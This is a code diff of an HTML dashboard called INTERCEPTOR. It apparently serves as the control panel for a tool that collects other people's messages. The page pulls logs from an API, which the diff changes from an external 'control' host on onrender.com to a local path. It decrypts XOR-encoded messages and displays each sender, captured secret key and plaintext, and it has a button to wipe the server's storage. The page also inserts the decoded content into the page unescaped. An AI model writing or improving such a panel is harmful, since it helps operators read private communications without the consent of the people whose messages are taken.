@@ -2,43 +2,43 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>INTERCEPTOR_V5.1</title>
+    <title>INTERCEPTOR_V6.5_STABLE</title>
     <style>
         :root { --n: #00ff41; --b: #050505; --r: #ff0055; }
-        body { background: var(--b); color: var(--n); font-family: monospace; padding: 20px; margin: 0; }
-        header { border-bottom: 2px solid var(--n); padding-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
+        body { background: var(--b); color: var(--n); font-family: monospace; padding: 20px; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
         th { border: 1px solid var(--n); padding: 12px; background: rgba(0,255,65,0.1); text-align: left; }
-        td { border: 1px solid #222; padding: 12px; word-break: break-all; vertical-align: top; }
-        .key-found { color: var(--r); font-weight: bold; border: 1px solid var(--r); padding: 2px 5px; }
-        .open { color: #0088ff; }
-        .text { color: #fff; font-weight: bold; font-size: 1.1em; }
+        td { border: 1px solid #222; padding: 12px; word-break: break-all; }
+        .key-box { color: var(--r); border: 1px solid var(--r); padding: 2px 5px; font-weight: bold; }
+        .res { color: #fff; font-size: 1.1em; font-weight: bold; }
     </style>
 </head>
 <body>
-    <header>
-        <div><strong>[ SYSTEM_INTERCEPT_LOGS ]</strong></div>
-        <button onclick="wipe()" style="background:var(--r); color:#000; border:none; padding:10px 20px; font-weight:bold; cursor:pointer;">PURGE_ALL</button>
+    <header style="display:flex; justify-content:space-between; border-bottom:2px solid var(--n); padding-bottom:10px;">
+        <strong>[ PACKET_ANALYZER_ONLINE ]</strong>
+        <button onclick="wipe()" style="background:var(--r); border:none; padding:10px; cursor:pointer; font-weight:bold;">WIPE_SERVER_STORAGE</button>
     </header>
     <table>
         <thead>
             <tr>
-                <th style="width:120px;">SENDER</th>
-                <th style="width:150px;">KEY_INFO</th>
-                <th>DECODED_CONTENT</th>
+                <th style="width:120px;">SOURCE</th>
+                <th style="width:150px;">SECRET_KEY</th>
+                <th>DECRYPTED_CONTENT</th>
             </tr>
         </thead>
         <tbody id="logs"></tbody>
     </table>
 <script>
-    const API = 'https://control-u6bq.onrender.com//api';
+    const API = '/api';
     function crypt(t, k) {
         if (!k) return t;
-        const te = new TextEncoder().encode(t);
-        const ke = new TextEncoder().encode(k);
-        return String.fromCharCode(...te.map((b, i) => b ^ ke[i % ke.length]));
+        let out = "";
+        for (let i = 0; i < t.length; i++) {
+            out += String.fromCharCode(t.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+        }
+        return out;
     }
-    async function wipe() { if(confirm("DELETE EVERYTHING?")) { await fetch(API, {method:'DELETE'}); update(); } }
+    async function wipe() { if(confirm("DELETE LOGS?")) { await fetch(API, {method:'DELETE'}); update(); } }
     async function update() {
         try {
             const r = await fetch(API);
@@ -47,15 +47,18 @@
             const tbody = document.getElementById('logs');
             tbody.innerHTML = "";
             lines.forEach(line => {
-                if(!line.includes(": ")) return;
                 let [u, full] = [line.split(": ")[0], line.split(": ").slice(1).join(": ")];
                 let [cipher, key] = full.split("::KEY::");
-                let res = key ? decodeURIComponent(crypt(atob(cipher), key)) : decodeURIComponent(atob(cipher));
-                tbody.innerHTML += `
-                <tr>
+                let decoded = "";
+                try {
+                    let raw = atob(cipher);
+                    decoded = decodeURIComponent(key ? crypt(raw, key) : raw);
+                } catch(e) { decoded = "[DECODE_ERROR]"; }
+                
+                tbody.innerHTML += `<tr>
                     <td>${u}</td>
-                    <td>${key ? '<span class="key-found">'+key+'</span>' : '<span class="open">OPEN_MSG</span>'}</td>
-                    <td class="text">${res}</td>
+                    <td>${key ? '<span class="key-box">'+key+'</span>' : 'OPEN'}</td>
+                    <td class="res">${decoded}</td>
                 </tr>`;
             });
         } catch(e) {}
